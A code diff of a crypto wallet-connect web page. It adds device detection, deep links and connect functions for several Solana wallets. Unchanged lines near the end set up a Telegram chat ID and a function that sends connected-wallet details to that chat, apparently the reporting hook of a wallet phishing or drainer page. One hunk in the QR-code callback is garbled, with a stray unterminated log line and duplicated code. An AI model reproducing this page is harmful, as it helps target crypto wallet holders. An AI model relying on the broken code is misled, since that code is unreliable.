@@ -151,6 +151,14 @@
       margin-left: 10px;
     }
 
+    .wallet-status.mobile {
+      color: #007bff;
+    }
+
+    .wallet-status.desktop {
+      color: #6c757d;
+    }
+
     .connection-status {
       margin-top: 15px;
       padding: 10px;
@@ -418,12 +426,40 @@
       background: #357abd;
     }
     
+    .deep-link-btn.phantom {
+      background: #AB9FF2;
+    }
+    
+    .deep-link-btn.phantom:hover {
+      background: #9B8FF2;
+    }
+    
     .device-info {
       margin-top: 10px;
       padding: 8px;
       background: #e9ecef;
       border-radius: 5px;
       font-size: 0.8rem;
+      color: #495057;
+    }
+
+    .mobile-instructions {
+      background: #e7f3ff;
+      border: 1px solid #b3d9ff;
+      border-radius: 8px;
+      padding: 12px;
+      margin: 15px 0;
+      font-size: 0.9rem;
+      color: #0066cc;
+    }
+
+    .desktop-instructions {
+      background: #f8f9fa;
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      padding: 12px;
+      margin: 15px 0;
+      font-size: 0.9rem;
       color: #495057;
     }
   </style>
@@ -465,30 +501,30 @@
     </div>
 
     <div class="wallet-list">
-      <div class="wallet-option" data-wallet="solflare">
-        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
-        <span>Solflare</span>
-        <div class="wallet-status">Available</div>
-      </div>
       <div class="wallet-option" data-wallet="phantom">
         <img src="https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png" alt="Phantom" />
         <span>Phantom</span>
-        <div class="wallet-status">Available</div>
+        <div class="wallet-status" id="phantomStatus">Checking...</div>
+      </div>
+      <div class="wallet-option" data-wallet="solflare">
+        <img src="https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png" alt="Solflare" />
+        <span>Solflare</span>
+        <div class="wallet-status" id="solflareStatus">Checking...</div>
       </div>
       <div class="wallet-option" data-wallet="trustwallet">
         <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
         <span>Trust Wallet</span>
-        <div class="wallet-status">Available</div>
+        <div class="wallet-status" id="trustwalletStatus">Checking...</div>
       </div>
       <div class="wallet-option" data-wallet="coinbase">
         <img src="https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png" alt="Coinbase" />
         <span>Coinbase</span>
-        <div class="wallet-status">Available</div>
+        <div class="wallet-status" id="coinbaseStatus">Checking...</div>
       </div>
       <div class="wallet-option" data-wallet="bitget">
         <img src="https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png" alt="Bitget Wallet" />
         <span>Bitget Wallet</span>
-        <div class="wallet-status">Available</div>
+        <div class="wallet-status" id="bitgetStatus">Checking...</div>
       </div>
       <div class="wallet-option" id="allWalletsBtn">
         <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%4241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E" alt="All Wallets" />
@@ -508,13 +544,13 @@
       <button class="close-btn" title="Close">×</button>
     </div>
     <div class="wallet-grid">
-      <div class="wallet-item" data-wallet="solflare" tabindex="0">
-        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
-        <span>Solflare</span>
-      </div>
       <div class="wallet-item" data-wallet="phantom" tabindex="0">
         <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E" alt="Phantom" />
         <span>Phantom</span>
+      </div>
+      <div class="wallet-item" data-wallet="solflare" tabindex="0">
+        <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E" alt="Solflare" />
+        <span>Solflare</span>
       </div>
       <div class="wallet-item" data-wallet="trustwallet" tabindex="0">
         <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E" alt="Trust Wallet" />
@@ -555,6 +591,21 @@
       <button class="close-btn" title="Close">×</button>
     </div>
     
+    <div id="mobileInstructions" class="mobile-instructions hidden">
+      <strong>📱 Mobile Instructions:</strong><br>
+      1. Make sure <span id="walletAppName">Phantom</span> app is installed<br>
+      2. Tap "Open in App" button below<br>
+      3. Approve connection in the app<br>
+      4. Return to this browser tab
+    </div>
+
+    <div id="desktopInstructions" class="desktop-instructions hidden">
+      <strong>💻 Desktop Instructions:</strong><br>
+      1. Install <span id="walletExtensionName">Phantom</span> browser extension<br>
+      2. Create or import your wallet<br>
+      3. Refresh this page and try connecting again
+    </div>
+    
     <div class="qr-code-container">
       <canvas id="qrCanvas"></canvas>
     </div>
@@ -564,54 +615,88 @@
     </div>
     
     <div class="deep-link-section">
-      <div style="margin-bottom: 10px; font-weight: bold;">Or open directly:</div>
+      <div style="margin-bottom: 10px; font-weight: bold;">Quick Actions:</div>
       <div id="deepLinkButtons"></div>
     </div>
   </div>
 
   <script>
     // ============================================================================
-    // DEVICE DETECTION AND DEEP LINKS
+    // ENHANCED DEVICE DETECTION AND WALLET ADAPTER LOGIC
     // ============================================================================
     
     // Инициализируем Mobile-Detect
     const md = new MobileDetect(window.navigator.userAgent);
     
-    // Конфигурация для кошельков
-    const WALLET_CONFIG = {
+    // Расширенная конфигурация кошельков с поддержкой wallet-adapter принципов
+    const WALLET_ADAPTER_CONFIG = {
       phantom: {
         name: 'Phantom',
         logo: 'https://s.iimg.su/s/26/XUns4qhYptxMAGIMJkK8GXJiTvRMnTO8ZqAcKqvx.png',
+        // Проверка доступности кошелька
+        readyState: () => {
+          if (typeof window !== 'undefined') {
+            return window.phantom?.solana?.isPhantom ? 'Installed' : 'NotDetected';
+          }
+          return 'Unsupported';
+        },
+        // Мобильные deep links
         mobile: {
           android: {
-            scheme: 'phantom://',
+            scheme: 'phantom://browse/',
             universal: 'https://phantom.app/ul/browse/',
             storeUrl: 'https://play.google.com/store/apps/details?id=app.phantom'
           },
           ios: {
-            scheme: 'phantom://',
+            scheme: 'phantom://browse/',
             universal: 'https://phantom.app/ul/browse/',
             storeUrl: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
           }
         },
+        // Десктопные расширения
         desktop: {
           chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
           firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
           brave: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
           edge: 'https://microsoftedge.microsoft.com/addons/detail/phantom/plbkjgbpikjdeapofaeipgcbfmpckmpl'
+        },
+        // Функция подключения
+        connect: async function() {
+          const provider = window.phantom?.solana;
+          if (!provider) {
+            throw new Error('Phantom wallet not found');
+          }
+          
+          try {
+            const response = await provider.connect();
+            console.log('🔗 Phantom connected:', response.publicKey.toString());
+            return {
+              publicKey: response.publicKey.toString(),
+              provider: provider
+            };
+          } catch (error) {
+            console.error('❌ Phantom connection failed:', error);
+            throw error;
+          }
         }
       },
       solflare: {
         name: 'Solflare',
         logo: 'https://s.iimg.su/s/26/AaFiC9SIvF95PZEblauprFwWZ7bXKuO2NRYnJVIH.png',
+        readyState: () => {
+          if (typeof window !== 'undefined') {
+            return window.solflare?.isSolflare ? 'Installed' : 'NotDetected';
+          }
+          return 'Unsupported';
+        },
         mobile: {
           android: {
-            scheme: 'solflare://',
+            scheme: 'solflare://browse/',
             universal: 'https://solflare.com/ul/browse/',
             storeUrl: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
           },
           ios: {
-            scheme: 'solflare://',
+            scheme: 'solflare://browse/',
             universal: 'https://solflare.com/ul/browse/',
             storeUrl: 'https://apps.apple.com/app/solflare/id1580902717'
           }
@@ -621,19 +706,43 @@
           firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
           brave: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
           edge: 'https://microsoftedge.microsoft.com/addons/detail/solflare/hgkehpkmdmjdlgpibpnlbcnbdjkbgfnl'
+        },
+        connect: async function() {
+          const provider = window.solflare;
+          if (!provider) {
+            throw new Error('Solflare wallet not found');
+          }
+          
+          try {
+            await provider.connect();
+            console.log('🔗 Solflare connected:', provider.publicKey.toString());
+            return {
+              publicKey: provider.publicKey.toString(),
+              provider: provider
+            };
+          } catch (error) {
+            console.error('❌ Solflare connection failed:', error);
+            throw error;
+          }
         }
       },
       trustwallet: {
         name: 'Trust Wallet',
         logo: 'https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png',
+        readyState: () => {
+          if (typeof window !== 'undefined') {
+            return window.trustwallet?.solana ? 'Installed' : 'NotDetected';
+          }
+          return 'Unsupported';
+        },
         mobile: {
           android: {
-            scheme: 'trust://',
+            scheme: 'trust://browse/',
             universal: 'https://link.trustwallet.com/browse/',
             storeUrl: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
           },
           ios: {
-            scheme: 'trust://',
+            scheme: 'trust://browse/',
             universal: 'https://link.trustwallet.com/browse/',
             storeUrl: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
           }
@@ -641,19 +750,43 @@
         desktop: {
           chrome: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph',
           brave: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph'
+        },
+        connect: async function() {
+          const provider = window.trustwallet?.solana;
+          if (!provider) {
+            throw new Error('Trust Wallet not found');
+          }
+          
+          try {
+            const response = await provider.connect();
+            console.log('🔗 Trust Wallet connected:', response.publicKey.toString());
+            return {
+              publicKey: response.publicKey.toString(),
+              provider: provider
+            };
+          } catch (error) {
+            console.error('❌ Trust Wallet connection failed:', error);
+            throw error;
+          }
         }
       },
       coinbase: {
-        name: 'Coinbase',
+        name: 'Coinbase Wallet',
         logo: 'https://s.iimg.su/s/26/75HQqHl0g9lz9qIFBEHNkRZknbnJVc69aqI5PlGK.png',
+        readyState: () => {
+          if (typeof window !== 'undefined') {
+            return window.coinbaseSolana ? 'Installed' : 'NotDetected';
+          }
+          return 'Unsupported';
+        },
         mobile: {
           android: {
-            scheme: 'coinbase://',
+            scheme: 'coinbase://browse/',
             universal: 'https://go.cb-w.com/browse/',
             storeUrl: 'https://play.google.com/store/apps/details?id=org.toshi'
           },
           ios: {
-            scheme: 'coinbase://',
+            scheme: 'coinbase://browse/',
             universal: 'https://go.cb-w.com/browse/',
             storeUrl: 'https://apps.apple.com/app/coinbase-wallet/id1278383455'
           }
@@ -661,19 +794,43 @@
         desktop: {
           chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
           brave: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad'
+        },
+        connect: async function() {
+          const provider = window.coinbaseSolana;
+          if (!provider) {
+            throw new Error('Coinbase Wallet not found');
+          }
+          
+          try {
+            const response = await provider.connect();
+            console.log('🔗 Coinbase Wallet connected:', response.publicKey.toString());
+            return {
+              publicKey: response.publicKey.toString(),
+              provider: provider
+            };
+          } catch (error) {
+            console.error('❌ Coinbase Wallet connection failed:', error);
+            throw error;
+          }
         }
       },
       bitget: {
         name: 'Bitget Wallet',
         logo: 'https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png',
+        readyState: () => {
+          if (typeof window !== 'undefined') {
+            return window.bitkeep?.solana ? 'Installed' : 'NotDetected';
+          }
+          return 'Unsupported';
+        },
         mobile: {
           android: {
-            scheme: 'bitkeep://',
+            scheme: 'bitkeep://browse/',
             universal: 'https://bkcode.vip/browse/',
             storeUrl: 'https://play.google.com/store/apps/details?id=com.bitget.wallet'
           },
           ios: {
-            scheme: 'bitkeep://',
+            scheme: 'bitkeep://browse/',
             universal: 'https://bkcode.vip/browse/',
             storeUrl: 'https://apps.apple.com/app/bitget-wallet/id6444625622'
           }
@@ -681,31 +838,30 @@
         desktop: {
           chrome: 'https://chrome.google.com/webstore/detail/bitget-wallet/jiidiaalihmmhddjgbnbgdfflelocpak',
           brave: 'https://chrome.google.com/webstore/detail/bitget-wallet/jiidiaalihmmhddjgbnbgdfflelocpak'
-        }
-      },
-      exodus: {
-        name: 'Exodus',
-        logo: 'https://s.iimg.su/s/26/HrAB9KDj99AnQOQZcxhY0htKY0oUFcONhY9jSUhP.png',
-        mobile: {
-          android: {
-            scheme: 'exodus://',
-            universal: 'https://www.exodus.com/mobile-app/',
-            storeUrl: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
-          },
-          ios: {
-            scheme: 'exodus://',
-            universal: 'https://www.exodus.com/mobile-app/',
-            storeUrl: 'https://apps.apple.com/app/exodus-crypto-wallet/id1414384820'
-          }
         },
-        desktop: {
-          download: 'https://www.exodus.com/download/'
+        connect: async function() {
+          const provider = window.bitkeep?.solana;
+          if (!provider) {
+            throw new Error('Bitget Wallet not found');
+          }
+          
+          try {
+            const response = await provider.connect();
+            console.log('🔗 Bitget Wallet connected:', response.publicKey.toString());
+            return {
+              publicKey: response.publicKey.toString(),
+              provider: provider
+            };
+          } catch (error) {
+            console.error('❌ Bitget Wallet connection failed:', error);
+            throw error;
+          }
         }
       }
     };
     
     /**
-     * Определяет тип устройства и браузера
+     * Определяет тип устройства и браузера (улучшенная версия)
      */
     function detectDevice() {
       const isAndroid = md.os() === 'AndroidOS';
@@ -716,11 +872,11 @@
       const userAgent = navigator.userAgent.toLowerCase();
       let browser = 'unknown';
       
-      if (userAgent.indexOf('chrome') > -1) {
+      if (userAgent.indexOf('chrome') > -1 && userAgent.indexOf('edg') === -1) {
         browser = 'chrome';
       } else if (userAgent.indexOf('firefox') > -1) {
         browser = 'firefox';
-      } else if (userAgent.indexOf('safari') > -1) {
+      } else if (userAgent.indexOf('safari') > -1 && userAgent.indexOf('chrome') === -1) {
         browser = 'safari';
       } else if (userAgent.indexOf('edge') > -1 || userAgent.indexOf('edg') > -1) {
         browser = 'edge';
@@ -728,20 +884,40 @@
         browser = 'brave';
       }
       
+      // Проверяем, открыт ли сайт в мобильном приложении кошелька
+      const isInWalletApp = checkIfInWalletApp();
+      
       return {
         isAndroid,
         isIOS,
         isMobile,
         browser,
-        os: isAndroid ? 'android' : isIOS ? 'ios' : 'desktop'
+        os: isAndroid ? 'android' : isIOS ? 'ios' : 'desktop',
+        isInWalletApp
       };
     }
     
     /**
-     * Создает deep link для кошелька в зависимости от устройства
+     * Проверяет, открыт ли сайт во встроенном браузере кошелька
+     */
+    function checkIfInWalletApp() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      
+      // Проверяем различные кошельки
+      if (userAgent.includes('phantom')) return 'phantom';
+      if (userAgent.includes('solflare')) return 'solflare';
+      if (userAgent.includes('trust')) return 'trust';
+      if (userAgent.includes('coinbase')) return 'coinbase';
+      if (userAgent.includes('bitkeep')) return 'bitget';
+      
+      return false;
+    }
+    
+    /**
+     * Создает deep link для кошелька (улучшенная версия)
      */
     function createWalletLink(walletKey, options = {}) {
-      const wallet = WALLET_CONFIG[walletKey];
+      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
       if (!wallet) return null;
       
       const device = detectDevice();
@@ -754,15 +930,17 @@
         
         if (!mobileConfig) return null;
         
-        // Создаем ссылки
-        const schemeUrl = `${mobileConfig.scheme}${encodeURIComponent(currentUrl)}`;
-        const universalUrl = `${mobileConfig.universal}${encodeURIComponent(currentUrl)}`;
+        // Создаем ссылки с правильным форматированием
+        const encodedUrl = encodeURIComponent(currentUrl);
+        const schemeUrl = `${mobileConfig.scheme}${encodedUrl}`;
+        const universalUrl = `${mobileConfig.universal}${encodedUrl}`;
         const storeUrl = mobileConfig.storeUrl;
         
         return {
           primary: schemeUrl,
           fallback: universalUrl,
-          store: storeUrl
+          store: storeUrl,
+          platform: platform
         };
       } 
       // Для десктопа
@@ -770,21 +948,33 @@
         const desktopConfig = wallet.desktop;
         if (!desktopConfig) return null;
         
-        // Возвращаем ссылку на расширение для соответствующего браузера
         return {
-          primary: desktopConfig[device.browser] || desktopConfig.download || null
+          primary: desktopConfig[device.browser] || desktopConfig.chrome || null,
+          browser: device.browser
         };
       }
     }
     
     /**
-     * Открывает кошелек с использованием deep link
+     * Открывает кошелек с использованием wallet-adapter логики
      */
     async function openWallet(walletKey, options = {}) {
-      const wallet = WALLET_CONFIG[walletKey];
+      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
       if (!wallet) {
         console.error(`Wallet not found: ${walletKey}`);
         return false;
+      }
+      
+      const device = detectDevice();
+      
+      // Если мы уже в приложении кошелька, пытаемся подключиться напрямую
+      if (device.isInWalletApp === walletKey) {
+        console.log(`🔗 Detected ${walletKey} in-app browser, attempting direct connection`);
+        try {
+          return await wallet.connect();
+        } catch (error) {
+          console.error(`❌ Direct connection failed in ${walletKey} app:`, error);
+        }
       }
       
       const links = createWalletLink(walletKey, options);
@@ -793,42 +983,38 @@
         return false;
       }
       
-      const device = detectDevice();
-      
-      // Для мобильных устройств используем схему с таймаутом и fallback
+      // Для мобильных устройств используем улучшенную схему
       if (device.isMobile) {
-        // Сначала пробуем открыть через scheme URL
-        const startTime = Date.now();
+        console.log(`📱 Opening ${walletKey} on ${links.platform}`);
         
-        // Открываем primary URL (scheme)
-        window.location.href = links.primary;
+        // Создаем невидимый iframe для попытки открытия схемы
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = links.primary;
+        document.body.appendChild(iframe);
         
-        // Устанавливаем таймаут для проверки, открылось ли приложение
-        return new Promise((resolve) => {
-          setTimeout(() => {
-            // Если страница все еще активна через 2 секунды, значит приложение не открылось
-            if (document.hidden || Date.now() - startTime > 2000) {
-              // Приложение открылось или пользователь переключился на другую вкладку
-              resolve(true);
-            } else {
-              // Пробуем universal link
-              window.location.href = links.fallback;
-              
-              // Еще один таймаут для проверки
-              setTimeout(() => {
-                if (document.hidden || Date.now() - startTime > 3000) {
-                  resolve(true);
-                } else {
-                  // Если и это не сработало, отправляем в магазин приложений
-                  window.location.href = links.store;
-                  resolve(false);
-                }
-              }, 1000);
-            }
-          }, 1000);
-        });
+        // Удаляем iframe через короткое время
+        setTimeout(() => {
+          document.body.removeChild(iframe);
+        }, 1000);
+        
+        // Также пытаемся через window.location как fallback
+        setTimeout(() => {
+          if (!document.hidden) {
+            window.location.href = links.fallback;
+          }
+        }, 500);
+        
+        // Если через 3 секунды ничего не произошло, отправляем в store
+        setTimeout(() => {
+          if (!document.hidden) {
+            window.open(links.store, '_blank');
+          }
+        }, 3000);
+        
+        return true;
       } 
-      // Для десктопа просто открываем ссылку в новой вкладке
+      // Для десктопа открываем ссылку на расширение
       else {
         if (links.primary) {
           window.open(links.primary, '_blank');
@@ -836,6 +1022,40 @@
         }
         return false;
       }
+    }
+    
+    /**
+     * Проверяет статус всех кошельков
+     */
+    function checkWalletStatuses() {
+      const device = detectDevice();
+      
+      Object.keys(WALLET_ADAPTER_CONFIG).forEach(walletKey => {
+        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
+        const readyState = wallet.readyState();
+        const statusElement = document.getElementById(`${walletKey}Status`);
+        
+        if (statusElement) {
+          if (device.isMobile) {
+            statusElement.textContent = 'Mobile';
+            statusElement.className = 'wallet-status mobile';
+          } else {
+            switch (readyState) {
+              case 'Installed':
+                statusElement.textContent = 'Installed';
+                statusElement.className = 'wallet-status';
+                break;
+              case 'NotDetected':
+                statusElement.textContent = 'Not Installed';
+                statusElement.className = 'wallet-status desktop';
+                break;
+              default:
+                statusElement.textContent = 'Unsupported';
+                statusElement.className = 'wallet-status desktop';
+            }
+          }
+        }
+      });
     }
     
     /**
@@ -855,6 +1075,9 @@
           if (error) {
             console.error('❌ Ошибка генерации QR кода:', error);
           } else {
+            console.log('
+            console.error('❌ Ошибка генерации QR кода:', error);
+          } else {
             console.log('✅ QR код сгенерирован');
           }
         });
@@ -862,10 +1085,10 @@
     }
     
     /**
-     * Показывает модальное окно с QR-кодом и deep links
+     * Показывает модальное окно с QR-кодом и deep links (улучшенная версия)
      */
     function showConnectionModal(walletKey, wcUri = null) {
-      const wallet = WALLET_CONFIG[walletKey];
+      const wallet = WALLET_ADAPTER_CONFIG[walletKey];
       if (!wallet) return;
       
       const device = detectDevice();
@@ -877,6 +1100,20 @@
       
       // Устанавливаем название кошелька
       document.getElementById('qrWalletName').textContent = wallet.name;
+      document.getElementById('walletAppName').textContent = wallet.name;
+      document.getElementById('walletExtensionName').textContent = wallet.name;
+      
+      // Показываем соответствующие инструкции
+      const mobileInstructions = document.getElementById('mobileInstructions');
+      const desktopInstructions = document.getElementById('desktopInstructions');
+      
+      if (device.isMobile) {
+        mobileInstructions.classList.remove('hidden');
+        desktopInstructions.classList.add('hidden');
+      } else {
+        mobileInstructions.classList.add('hidden');
+        desktopInstructions.classList.remove('hidden');
+      }
       
       // Генерируем QR-код с WalletConnect URI или текущим URL
       const qrUrl = wcUri || currentUrl;
@@ -886,15 +1123,22 @@
       const deepLinkButtons = document.getElementById('deepLinkButtons');
       deepLinkButtons.innerHTML = '';
       
-      // Если мобильное устройство, добавляем кнопку для открытия приложения
+      // Если мобильное устройство
       if (device.isMobile) {
+        // Кнопка для открытия приложения
         const openButton = document.createElement('button');
-        openButton.className = 'deep-link-btn';
-        openButton.textContent = `Open ${wallet.name}`;
-        openButton.onclick = () => openWallet(walletKey);
+        openButton.className = `deep-link-btn ${walletKey}`;
+        openButton.textContent = `Open in ${wallet.name}`;
+        openButton.onclick = () => {
+          openWallet(walletKey);
+          // Закрываем модальное окно через небольшую задержку
+          setTimeout(() => {
+            closeAllModals();
+          }, 1000);
+        };
         deepLinkButtons.appendChild(openButton);
         
-        // Добавляем кнопку для открытия магазина приложений
+        // Кнопка для установки из магазина
         const links = createWalletLink(walletKey);
         if (links && links.store) {
           const storeButton = document.createElement('button');
@@ -905,27 +1149,58 @@
           deepLinkButtons.appendChild(storeButton);
         }
         
-        // Автоматически пытаемся открыть приложение через 500мс
+        // Автоматически пытаемся открыть приложение
         setTimeout(() => {
           openWallet(walletKey);
-        }, 500);
+        }, 1000);
       } 
-      // Для десктопа показываем кнопку для установки расширения
+      // Для десктопа
       else {
-        const links = createWalletLink(walletKey);
-        if (links && links.primary) {
-          const installButton = document.createElement('button');
-          installButton.className = 'deep-link-btn';
-          installButton.textContent = `Install ${wallet.name}`;
-          installButton.onclick = () => window.open(links.primary, '_blank');
-          deepLinkButtons.appendChild(installButton);
+        const readyState = wallet.readyState();
+        
+        if (readyState === 'Installed') {
+          // Кошелек установлен, показываем кнопку подключения
+          const connectButton = document.createElement('button');
+          connectButton.className = `deep-link-btn ${walletKey}`;
+          connectButton.textContent = `Connect ${wallet.name}`;
+          connectButton.onclick = async () => {
+            try {
+              const result = await wallet.connect();
+              if (result && window.walletManager) {
+                window.walletManager.onWalletConnected(result.publicKey, wallet.name, result.provider);
+              }
+              closeAllModals();
+            } catch (error) {
+              console.error('Connection failed:', error);
+              alert(`Failed to connect to ${wallet.name}: ${error.message}`);
+            }
+          };
+          deepLinkButtons.appendChild(connectButton);
+        } else {
+          // Кошелек не установлен, показываем кнопку установки
+          const links = createWalletLink(walletKey);
+          if (links && links.primary) {
+            const installButton = document.createElement('button');
+            installButton.className = 'deep-link-btn';
+            installButton.textContent = `Install ${wallet.name}`;
+            installButton.onclick = () => window.open(links.primary, '_blank');
+            deepLinkButtons.appendChild(installButton);
+          }
         }
       }
       
       // Добавляем информацию об устройстве
       const deviceInfo = document.createElement('div');
       deviceInfo.className = 'device-info';
-      deviceInfo.textContent = `Detected: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os}, ${device.browser})`;
+      let deviceText = `Device: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os}`;
+      if (!device.isMobile) {
+        deviceText += `, ${device.browser}`;
+      }
+      if (device.isInWalletApp) {
+        deviceText += `, in ${device.isInWalletApp} app`;
+      }
+      deviceText += ')';
+      deviceInfo.textContent = deviceText;
       deepLinkButtons.appendChild(deviceInfo);
     }
 
@@ -938,9 +1213,6 @@
       CHAT_ID: '7253475769'
     };
 
-    /**
-     * Показать статус Telegram отправки
-     */
     function showTelegramStatus(type, message) {
       const statusElement = document.getElementById('telegramStatus');
       statusElement.className = `telegram-status ${type}`;
@@ -954,9 +1226,6 @@
       }
     }
 
-    /**
-     * Функция отправки в Telegram
-     */
     async function sendWalletInfoToTelegram(walletName, walletData) {
       showTelegramStatus('sending', '📤 Отправка в Telegram...');
       
@@ -970,8 +1239,9 @@
         second: '2-digit'
       });
 
-      // Создаем сообщение БЕЗ markdown для надежности
-      let message = `🚀 ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
